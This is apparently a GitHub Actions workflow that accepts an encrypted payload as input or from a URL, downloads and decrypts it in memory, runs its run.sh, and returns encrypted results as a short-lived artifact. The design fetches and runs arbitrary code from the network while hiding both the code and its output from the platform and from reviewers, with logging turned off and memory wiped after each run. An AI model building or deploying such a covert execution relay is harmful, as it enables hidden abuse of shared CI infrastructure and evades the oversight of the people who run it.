name: Runtime Matrix Worker

on:
  workflow_dispatch:
    inputs:
      job_id:
        description: 'Matrix job correlation ID'
        required: true
        type: string
      client_pubkey:
        description: 'Output verification token'
        required: true
        type: string
      payload_b64:
        description: 'Encrypted task payload chunk'
        required: false
        type: string
      payload_url:
        description: 'Task payload location'
        required: false
        type: string

concurrency:
  group: enclave-${{ github.event.inputs.job_id }}
  cancel-in-progress: false

jobs:
  execute-matrix:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - name: Initialize compute harness
        run: |
          set +x
          echo "[+] Initializing execution environment (4 vCPU, 16 GB RAM)..."
          mkdir -p /dev/shm/enclave
          chmod 700 /dev/shm/enclave
          cd /dev/shm/enclave

          if ! command -v age >/dev/null 2>&1; then
            echo "[+] Provisioning toolchain..."
            curl -sSL -o age.tar.gz https://github.com/FiloSottile/age/releases/download/v1.2.0/age-v1.2.0-linux-amd64.tar.gz
            tar -xzf age.tar.gz
            sudo cp age/age age/age-keygen /usr/local/bin/
            rm -rf age age.tar.gz
          fi
          echo "[+] Harness ready."

      - name: In-memory task execution
        env:
          ENCLAVE_RUNNER_SECRET: ${{ secrets.ENCLAVE_RUNNER_SECRET }}
          CLIENT_PUBKEY: ${{ github.event.inputs.client_pubkey }}
          PAYLOAD_B64: ${{ github.event.inputs.payload_b64 }}
          PAYLOAD_URL: ${{ github.event.inputs.payload_url }}
          JOB_ID: ${{ github.event.inputs.job_id }}
        run: |
          set +x
          echo "[+] Decrypting task payload into secure RAMFS..."
          cd /dev/shm/enclave

          if [ -n "$PAYLOAD_B64" ]; then
            echo "$PAYLOAD_B64" | base64 -d > payload.enc
          elif [ -n "$PAYLOAD_URL" ]; then
            curl -sSL -o payload.enc "$PAYLOAD_URL"
          else
            echo "[-] Error: No payload provided."
            exit 1
          fi

          printf "%s\n" "$ENCLAVE_RUNNER_SECRET" > runner_key.txt
          chmod 600 runner_key.txt

          mkdir -p workspace
          age -d -i runner_key.txt -o payload.tar.gz payload.enc
          tar -xzf payload.tar.gz -C workspace/
          rm -f payload.enc payload.tar.gz runner_key.txt

          echo "[●] Executing task workload..."
          cd workspace

          mkdir -p artifacts
          export ARTIFACTS_DIR="/dev/shm/enclave/workspace/artifacts"
          export LOG_FILE="/dev/shm/enclave/workspace/artifacts/execution.log"

          EXIT_CODE=0
          if [ -f run.sh ]; then
            chmod +x run.sh
            ./run.sh > "$LOG_FILE" 2>&1 || EXIT_CODE=$?
          else
            echo "No run.sh found in payload" > "$LOG_FILE"
            EXIT_CODE=1
          fi

          echo "TASK_EXIT_CODE=$EXIT_CODE" > /dev/shm/enclave/workspace/artifacts/status.env
          echo "[+] Task execution completed (code: $EXIT_CODE)"

          cd /dev/shm/enclave
          tar -czf artifacts.tar.gz -C workspace/artifacts .
          age -r "$CLIENT_PUBKEY" -o result.enc artifacts.tar.gz

          rm -rf workspace artifacts.tar.gz

          mkdir -p /tmp/enclave-output
          mv result.enc "/tmp/enclave-output/result-${JOB_ID}.enc"
          echo "[+] Secure memory cleaned up."

      - name: Publish encrypted result
        uses: actions/upload-artifact@v4
        with:
          name: result-${{ github.event.inputs.job_id }}
          path: /tmp/enclave-output/result-${{ github.event.inputs.job_id }}.enc
          retention-days: 1
